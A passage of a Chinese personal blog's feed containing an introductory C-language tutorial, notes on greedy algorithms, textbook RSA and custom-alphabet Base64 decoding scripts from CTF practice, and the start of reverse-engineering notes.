title="我们学了C语言是要干什么"></a>我们学了C语言是要干什么</h2><p>​了解了C语言的过程,我们作为C这门技术的使用者,我们的职责就是:设计算法(或者由其他人设计好,例如数学家等)-&gt;构思程序-&gt;使用C语言进行程序的编写-&gt;进行调试测试-&gt;确认无误后生成正式的程序-&gt;将程序用于实际的生产作业来发挥作用.</p><p>​最关键的就是程序编写和调试测试.</p><p>​所以这种工作叫做开发者…</p><p>​—WAHAHA，2023.9.19</p><p>上一篇:<a href="../2023-09-19-2e85aaf67188/">写在前面</a></p><p>下一篇:<a href="../2023-09-19-bb3b8099b657/">c语言教程-2-环境搭建</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程---写在前面</title>
      <link href="/2023-09-19-2e85aaf67188/"/>
      <url>/2023-09-19-2e85aaf67188/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么开始写这个教程"><a href="#为什么开始写这个教程" class="headerlink" title="为什么开始写这个教程"></a>为什么开始写这个教程</h1><p>首先,写这篇文章的时候，我也是一名大二的学生，但是我是从初二就开始因为兴趣开始接触c语言，中途也是起起伏伏随便学到现在的。其实因为没有师傅领进门浪费了很多时间，而且这门语言身边也没有人愿意来用，就导致我壹个人在学这门语言。</p><p>那么作为一个C的死忠粉，尽管我的实力有限，但是同阶段而言，我的C语言是非常熟练的。毕竟C很老了，而且有很多后起之秀，未来这门语言的形势也未曾可知，但是作为一门我的启蒙语言，我目前体会最深刻的一门语言，我想把我对这门语言的看法记录下来，融入我的这篇教程（<del>随笔</del>），以后再回头也能回忆起当时这门语言对我的影响之深。</p><p>本教程面向C初学者、上网闲逛的C爱好者、以及需要深入学习C语言的朋友（比如CTF比赛中的PWN，RE选手），在很多时候我写一些工具反而更愿意使用C语言。如果各位想找到浅显快速的入门教程，那么也许<code>菜鸟教程</code>(是一个网站名,并没有任何别的意思doge)更适合您，如果您有充足的时间和兴趣，又没有精力去认真读一些C语言的书,那么这个文章可能比较适合您对C有进一步的认识。</p><p>很多人擅长编写程序，但是不是每一个人都是一个好的阅读者（阅读他人的代码），包括我也有非常大的学习进步空间—我也刚大二（逃~），特别是一名RE手，更要在面对IDA分析出的繁杂的伪代码（C伪代码）时有着敏锐的感觉。那么，对于C语言的理解、对于程序设计思想的认识就更为重要，要从程序的目的出发，去思考代码应该是什么样的（或者说也许会被写成什么样子）。</p><p>那么我现在就想从一个摸爬滚打的计算机fw的角度来把我自己的感悟记录下来，所以也许这篇教程更像是自己的一个笔记&#x2F;记录，如果有幸被各位看到，有不认同的地方还请谅解，欢迎讨论。从现在开始，这篇教程就开始编写，无所谓被多少人看到（能看到最好—谁不想自己的努力被人认可呢doge），能写多少也未知晓，虽然会花费很多时间，但是愿意做这个记录，日后回看也是好事，但愿能多写一点。</p><p>​另外,由于是在博客中编写,所以请到我的博客的目录栏目中逐个点击阅读。</p><p>​在文章中,有一部分内容碍于篇幅和本人的能力,没有办法完全详细的写在其中,读者可以自行查阅资料,这也算是学习的一个环节.</p><p>（以上包含了一些个人的情绪，请忽略~~~doge）</p><p>​—WAHAHA，2023.9.19</p><h1 id="学习C语言应该保持怎样的态度"><a href="#学习C语言应该保持怎样的态度" class="headerlink" title="学习C语言应该保持怎样的态度"></a>学习C语言应该保持怎样的态度</h1><p>（写完发现怎么写成“如何学习”教程了。。。）</p><h2 id="对C语言应该保持怎样的-学习-态度"><a href="#对C语言应该保持怎样的-学习-态度" class="headerlink" title="对C语言应该保持怎样的(学习)态度"></a>对C语言应该保持怎样的(学习)态度</h2><p>我相信大部分学C语言的人都是被迫的，无论是因为学校的课程，亦或是需求所迫。目前在我看来，90%学C语言的人日后工作都不会再使用这门语言。RUST，golang，python等新语言，其他新技术的出现，还有C语言自身的不可否认的一些缺陷，都让C语言这个老古董逐渐退出舞台。所以本教程适合给想要好好学C的人看。</p><p>但是其实，C语言目前还是不可或缺的（2023年），很多人都会说，我也同样要说，目前在我看来，最接近底层，最容易理解的语言，还要属C语言，C仅次于汇编的简单粗暴让C在速度，自由度上有着极大的优势，同时这也是为什么C被称为中级语言的原因。而且这些特点也和C的发展历史、开发初衷不可分割。具体可以去看《C和指针》、《C专家编程》等书。</p><p>同时由于C语言的这些特性，也让他在当今显得不再合适，更高效率的开发模式依赖新技术，我个人支持，不过C语言我仍然放不下。虽然所谓的“C语言用来系统开发”，“C语言用来写底层非常高效”这些说法确实是C的强项，Linux，UNIX等系统，一些重要程序也都是纯C编写的，但是现在的开发讲求效率，便于维护，C语言就显得比较老旧。</p><p>但是无论C的形势如何，适合用C的地方，其他语言真的是不可替代的。想要应付考试，也可以移步其他教程更为快速有效，毕竟本人还是想好好的把自己的心得记录下来，<strong>而不是简单的应付考试</strong>。</p><h2 id="如何成为一个合格的学习者"><a href="#如何成为一个合格的学习者" class="headerlink" title="如何成为一个合格的学习者"></a>如何成为一个合格的学习者</h2><p>废话一大堆，我认为学C语言最重要的一点就是“<code>认清你的目标</code>”，你的目标决定了你的学习方法，深入学习和快速上手是不一样的，如果您确实对C有着很大的好感，例如作为兴趣，那么欢迎来看我的文章，并欢迎讨论。如果您需要快速上手，那么也许菜鸟教程，一些视频课程应该更适合您。</p><p>同时还要“<strong>自觉主动</strong>”，学习是自己的事情，特别是认真学习C语言更是你的选择，不要想着别人应该有义务去教你，有不懂的地方，自觉查资料，自己去弄懂，C语言是一门技能，而不是一门课程，按照学一门课程的思维去学习C语言是掌握不了这门技能的。</p><p>学习不可避免要提问，“<code>提问的艺术</code>”是必须掌握的，无论你学什么，你都应该先认真掌握提问的艺术！！！</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/3cfd9b4a0f10ffb73edd760db6f89b24.jpg" alt="3cfd9b4a0f10ffb73edd760db6f89b24" style="zoom:50%;" /><p>具体请移步↓</p><p><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md</a></p><p>“提问的艺术”中，我着重要强调的一点是“<strong>保持礼貌</strong>”，别人不是你的学习工具，没有哪怕一丁点的义务去帮助你，所以，无论是面对你的学长&#x2F;学弟&#x2F;老师&#x2F;同学&#x2F;学习群友&#x2F;论坛坛友&#x2F;团队成员,都(TMD)放尊重点!!!因为见过很不礼貌的人（某些学习群群友等）,他最终得不到任何的帮助,反而让回答者感到很不舒服。</p><p><code>吾师道也，夫庸知其年之先后生于吾乎？是故无贵无贱，无长无少，道之所存，师之所存也。任何人只要有技术,都可以成为你的老师,面对有学问的人,首当其冲的就是尊重。</code></p><p>接下来要注意的就是，<code>永远不要高估自己的实力</code>，也不要绝对相信自己的判断，保持谦虚求实的态度会让你进步的更加迅速。</p><h1 id="技术方面上学习C语言的注意事项"><a href="#技术方面上学习C语言的注意事项" class="headerlink" title="技术方面上学习C语言的注意事项"></a>技术方面上学习C语言的注意事项</h1><p>下面是一些常见的问题,读者必须注意(除非你想在提问时被回答者骂,或者浪费大量时间甚至放弃学习C语言)</p><h2 id="我要买一本什么书来看"><a href="#我要买一本什么书来看" class="headerlink" title="我要买一本什么书来看?"></a>我要买一本什么书来看?</h2><p>1.作为一个想要认真学C的人,你需要一本工具书↓</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927000417997.png" alt="image-20230927000417997" style="zoom:33%;" /><p>2.作为一个新手,你需要一本入门书—如果你觉得上面那本书太难的话↓</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927000349389.png" alt="image-20230927000349389" style="zoom:33%;" /><p>3.查漏补缺的,有《你必须知道的495个C语言问题》</p><p>4.进阶的,有C语言三剑客—《C和指针》《C专家编程》《C陷阱与缺陷》</p><p>5.大名鼎鼎的”谭浩强C语言”(红书),对书不对人,谭老的这本书虽然经典,但是放在现在(2023年)有点过时了,而且这本书的习题集真的别做,很多都是错误的.不过这本书的第五版更新了,感觉还可以.</p><p>如果是我推荐,我推荐《C primer plus》,因为它是公认的一本好书,我也基本看完了.</p><p>如果你对你的阅读能力和耐心比较自信,那么《C primer plus》;如果你看不进去,那么第2本可能更适合你.</p><p>剩下的书,用于查漏补缺或进阶.</p><p>总之,只要不看乱七八糟的烂书就行.</p><h2 id="我的代码为什么跑不通了-软件问题"><a href="#我的代码为什么跑不通了-软件问题" class="headerlink" title="我的代码为什么跑不通了?软件问题?"></a>我的代码为什么跑不通了?软件问题?</h2><p>作为C语言的学习者，你不可避免的会遇到很多看似正确，实则错误的写法，这也许怪不得你，因为<code>C语言如此精简</code>使得很多不经意的修改并不会导致语法上的错误，甚至在逻辑结果上在小范围内都不会有任何问题。所以，如果你发现你的程序换一个输入或者做了一个小修改，结果就不对了，请<code>首先不要质疑你的编译器/IDE/操作系统等等---他们一般情况下比你高明多了，先去考虑自己的代码哪里有问题</code>。</p><h2 id="我的软件怎么配置不好"><a href="#我的软件怎么配置不好" class="headerlink" title="我的软件怎么配置不好?"></a>我的软件怎么配置不好?</h2><p>初学，不要纠结任何软件问题，不要去考验自己，我本人是<code>极其不建议</code>新手去使用VSCode等需要高度自定义的软件的（并没有批评VSCode的意思），一句话：“先让程序跑起来，能跑就行”.后面会有专门的篇章进行讲解软件的选择和安装.</p><h2 id="好多重点-我要不要记笔记"><a href="#好多重点-我要不要记笔记" class="headerlink" title="好多重点,我要不要记笔记?"></a>好多重点,我要不要记笔记?</h2><p>学习C语言过程中，个人建议不要用任何笔记软件做哪怕任何笔记（ASCII码表等硬性知识除外），因为这样效率太低了!</p><p>请学习一点知识，打开你的编辑器，写一个特定功能的程序，<code>把你的笔记作为这个程序的注释放进去</code>，<code>存好这个程序</code>，这才是实打实的东西！！！</p><h2 id="没电脑-其他设备可以用吗"><a href="#没电脑-其他设备可以用吗" class="headerlink" title="没电脑,其他设备可以用吗?"></a>没电脑,其他设备可以用吗?</h2><p>可以,如果你实在没电脑的话,用手机平板都是可以的,这时候就别想着这些平台的编译器能有多好用,能跑就行.</p><p>所以,有条件的话还是要配一台电脑的,哪怕是十年前的烂电脑都行.</p><h1 id="约定和注意事项"><a href="#约定和注意事项" class="headerlink" title="约定和注意事项"></a>约定和注意事项</h1><h2 id="本教程的问题"><a href="#本教程的问题" class="headerlink" title="本教程的问题"></a>本教程的问题</h2><p>本教程的问题很明显,前后可能不太连贯,很多知识会”放到后面讲”,出现这个问题的原因是笔者想将各个概念讲好,而不是一带而过.</p><p>另外,教程可能不会包含一些非常简单的，在书上就能找到的东西—例如一些基本的计算机常识—你应该同时找一本书作为参考或者多去搜索！</p><h2 id="可能存在的超前的内容"><a href="#可能存在的超前的内容" class="headerlink" title="可能存在的超前的内容"></a>可能存在的超前的内容</h2><p>因为本书主要从讲解思路作为切入点,所以一些代码片段可能还没有讲解,就放进来作为示例了.</p><p>所以本教程默认各位连着看下来,同时有较强的搜索能力和理解能力—实际上就是希望大家尽量学会去<code>猜---猜代码的用途</code>,你可能并不需要把某一行代码彻底理解,只要猜出来结果是干什么的就行.</p><p>例如:笔者会直接引入输入输出的两个函数—<code>scanf()和printf()</code>,此时,你应该做到无需关心这两个函数的原理和写法,如果我们有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br></pre></td></tr></table></figure><p>读者应该只需要意识到这段代码用于给a输入一个整数,而无需关心这行代码的各个部分到底是为什么这么写.</p><p>同理,如果我们有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br></pre></td></tr></table></figure><p>读者应该只需要意识到这段代码用于输出a的值,也就是<code>3</code>,而无需关心这行代码的各个部分到底是为什么这么写.</p><p>同时,<code>int a=3;</code>读者可能不知道int是干什么的,但是看到a&#x3D;3就应该意识到:<code>总之这行代码就是让一个变量a的值为3</code>.</p><p>其他同理,学习要学会去适当合理的猜测.</p><p><code>另外,所有&quot;超前&quot;的内容,后面一定会讲到!</code></p><p>那么，讲到现在，也算是发了一点牢骚—因为踩过坑，不想让其他人再踩.之后就正式开始写教程.</p><p>​—WAHAHA，2023.9.27</p><p>下一篇:<a href="../2023-09-19-a9f92809d221/">c语言教程-1-什么是程序</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贪心算法思想</title>
      <link href="/2023-09-18-51f1d01423f5/"/>
      <url>/2023-09-18-51f1d01423f5/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是贪心"><a href="#什么是贪心" class="headerlink" title="什么是贪心"></a>什么是贪心</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>总是做出<strong>当前</strong>最好的选择,期望通过<strong>局部</strong>最优选择得到<strong>全局</strong>最优的解决方案</p><p>即从问题的初始解开始一步一步选择当前最优,逐步逼近问题的目标,即使得不到最优解也能得到其近似</p><h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>贪心选择性质:原问题的整体最优解可以分解为一系列相似的局部最优解,每一步的选择都依赖于前面的选择,但不依赖于未作出的选择</p><h3 id="最优子结构性质"><a href="#最优子结构性质" class="headerlink" title="最优子结构性质"></a>最优子结构性质</h3><p>当一个问题的最优解包含其子问题的最优解时，称此问题具有最优子结构性质</p><p>原问题S&#x3D; {a1,a2 ,…,ai,…,an }，通过贪心选择选出一个当前最优解{ai}之后，</p><p>转化为求解子问题S -{ai }，如果原问题的最优解包含子问题的最优解，则说明该问题满足最优子结构性质</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230918020525646.png" alt="image-20230918020525646" style="zoom:50%;" /></p><h2 id="求解步骤"><a href="#求解步骤" class="headerlink" title="求解步骤"></a>求解步骤</h2><p>选择贪心策略—以什么标准做出选择</p><p>局部最优解—根据贪心策略一步步地得到局部最优解</p><p>全局最优解—合并所有局部最优解—&gt;得到原问题规模(?)的全局最优解</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA</title>
      <link href="/2023-09-17-abcb05c55138/"/>
      <url>/2023-09-17-abcb05c55138/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RSA是目前使用最广泛的公钥密码体制之一。它是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。<br> RSA算法的安全性基于RSA问题的困难性，也就是基于大整数因子分解的困难性上。但是RSA问题不会比因子分解问题更加困难，也就是说，在没有解决因子分解问题的情况下可能解决RSA问题，因此RSA算法并不是完全基于大整数因子分解的困难性上的。</p><p>注:RSA的相关证明涉及到中国剩余定理的利用</p><h1 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h1><h2 id="RSA产生公私钥对"><a href="#RSA产生公私钥对" class="headerlink" title="RSA产生公私钥对"></a>RSA产生公私钥对</h2><p>1.选取两个大素数 <code>p,q</code>,为了最大的安全性,p,q的位数相等</p><p>2.计算乘积 <code>n=p*q</code></p><p>3.随机取加密密钥 <code>e</code>,使得e和(p-1)(q-1)互素,然后使用欧几里得算法计算解密密钥<code>d</code></p><p>​即有公式 <code>d = e^-1 mod (p-1)(q-1)</code></p><p>注意:</p><p>d和n也互素,至此,<code>e</code>和<code>n</code>为公钥,<code>d</code>为私钥</p><p>实际应用中，<code>e</code> 常常选择65537 (?)</p><h2 id="RSA的加解密算法"><a href="#RSA的加解密算法" class="headerlink" title="RSA的加解密算法"></a>RSA的加解密算法</h2><p>设有明文<code>m</code>,密文为<code>c</code>,其中<code>0&lt;=m&lt;n,0&lt;=c&lt;n</code></p><p>则加密算法为:</p><p>​<code>c = m^e mod n</code></p><p>解密算法为:</p><p>​<code>m = c^d mod n</code></p><h1 id="RSA对明文的加解密的过程"><a href="#RSA对明文的加解密的过程" class="headerlink" title="RSA对明文的加解密的过程"></a>RSA对明文的加解密的过程</h1><p>1.首先对于明文<code>M</code>,要对其进行比特串分组,确保每个分组<code>m</code>的十进制数都小于n(即<code>0&lt;=m&lt;n</code>)</p><p>2.然后对每个分组进行加密,整合为密文<code>C</code></p><p>3.对与密文<code>C</code>同理分组为<code>c</code>,有<code>0&lt;=c&lt;n</code></p><p>4.对其进行解密,最终整合为明文<code>M</code></p><h1 id="加解密脚本"><a href="#加解密脚本" class="headerlink" title="加解密脚本"></a>加解密脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知公私钥</span></span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">6376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = input(&#x27;请输入密文&#x27;)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 对n取欧拉函数,p,q均为素数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># 即e*d mod phi_n = 1 (求逆元)</span></span><br><span class="line">m = gmpy2.powmod(c, d, n)  <span class="comment"># 即m = c^d mod n (求大整数c的d次幂模n取余)</span></span><br><span class="line"><span class="built_in">print</span>(m)  <span class="comment"># 求得的明文</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果已知公私钥</span></span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = input(&#x27;请输入明文&#x27;)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 对n取欧拉函数,p,q均为素数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># 即e*d mod phi_n = 1 (求逆元)</span></span><br><span class="line">c = gmpy2.powmod(m, e, n)  <span class="comment"># 即c = m^e mod n (求大整数m的e次幂模n取余)</span></span><br><span class="line"><span class="built_in">print</span>(c)  <span class="comment"># 求得的密文</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="常用网站"><a href="#常用网站" class="headerlink" title="常用网站"></a>常用网站</h1><p>解析公钥文件: <a href="http://tool.chacuo.net/cryptrsakeyparse">http://tool.chacuo.net/cryptrsakeyparse</a></p><p>进制转换: <a href="http://www.hiencode.com/jinzhi.html">http://www.hiencode.com/jinzhi.html</a></p><p>n分解为p,q: <a href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a>?</p>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Base64</title>
      <link href="/2023-09-17-18510efe0389/"/>
      <url>/2023-09-17-18510efe0389/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>(见<a href="https://blog.csdn.net/local_752/article/details/121970823">https://blog.csdn.net/local_752/article/details/121970823</a>)</p><p>Base64是一种用64个字符表示所有二进制数据的编码方式，通过将二进制数据每6位一组的方式重新组织，刚好可以使用0~9的数字、大小写字母以及“+”和“&#x2F;”总共64个字符表示从<code>000000</code>到<code>111111</code>的64种状态</p><p>它实际上是一种“二进制到文本”的编码方法</p><p>Base64是一种用64个字符(这64个字符中包括大小写字母、数字、＋和／，还有用来补缺的特殊字符&#x3D;)来表示任意二进制数据的方法。它是一种编码方式，而非加密方式。它通过将二进制数据转变为64个“可打印字符”，完成了数据在HTTP协议上的传输。通过将二进制数据每6位一组的方式重新组织，刚好可以使用0~9的数字、大小写字母以及“+”和“&#x2F;”总共64个字符表示从<code>000000</code>到<code>111111</code>的64种状态</p><p>注意：由于base64编码用了8位字符来表示信息中的6个位，所以base64编码字符串大约比原始值扩大了33%。</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230917180421686.png" alt="image-20230917180421686"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230917180421686.png"></p><h1 id="变表Base64"><a href="#变表Base64" class="headerlink" title="变表Base64"></a>变表Base64</h1><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">original_title</span>():</span><br><span class="line">    <span class="comment"># 原来的题目</span></span><br><span class="line">    str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">    string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;welcome to moectf\ninput your flag and I wiil check it:&#x27;</span>)</span><br><span class="line">    enc_flag = base64.b64encode(flag.encode()).decode()</span><br><span class="line">    enc_flag = enc_flag.translate(<span class="built_in">str</span>.maketrans(string2, string1))</span><br><span class="line">    <span class="keyword">if</span> enc_flag == str1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;good job!!!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;something wrong???&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>():</span><br><span class="line">    <span class="comment"># 方法1</span></span><br><span class="line">    str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">    string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">    convert_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string1)):</span><br><span class="line">        ch1 = string1[i]</span><br><span class="line">        ch2 = string2[i]</span><br><span class="line">        convert_dict[ch1] = ch2</span><br><span class="line"></span><br><span class="line">    str2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> convert_dict.keys():</span><br><span class="line">            str2 += i</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        j = convert_dict[i]</span><br><span class="line">        str2 += j</span><br><span class="line">    flag = base64.b64decode(str2.encode()).decode()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt2</span>():</span><br><span class="line">    <span class="comment"># 方法2</span></span><br><span class="line">    str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">    string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    flag = base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string2, string1)))</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt1()</span></span><br><span class="line">decrypt2()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向做题总结</title>
      <link href="/2023-09-15-492d498a547d/"/>
      <url>/2023-09-15-492d498a547d/</url>
      
        <content type="html"><![CDATA[<h1 id="软件使用技巧"><a href="#软件使用技巧" class="headerlink" title="软件使用技巧"></a>软件使用技巧</h1><h2 id="IDA变量分析错误"><a href="#IDA变量分析错误" class="headerlink" title="IDA变量分析错误"></a>IDA变量分析错误</h2><p>2023.9.15</p><p>使用IDA进行分析时发现一些奇怪的代码,特别是有一些奇怪的指针强转(例如引用char数组的元素时强转为_DWORD*)时要去注意看IDA中变量的类型有无错误,多余,缺失.</p><h3 id="例题1—BUUCTF-不一样的flag"><a href="#例题1—BUUCTF-不一样的flag" class="headerlink" title="例题1—BUUCTF-不一样的flag"></a>例题1—BUUCTF-不一样的flag</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 